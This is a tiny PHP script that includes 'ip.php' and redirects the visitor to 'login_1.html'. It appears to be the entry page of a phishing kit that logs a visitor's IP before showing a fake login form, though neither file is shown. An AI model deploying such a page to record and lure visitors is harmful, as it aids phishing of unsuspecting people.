<?php
include 'ip.php';
header('Location: login_1.html');
exit
?>
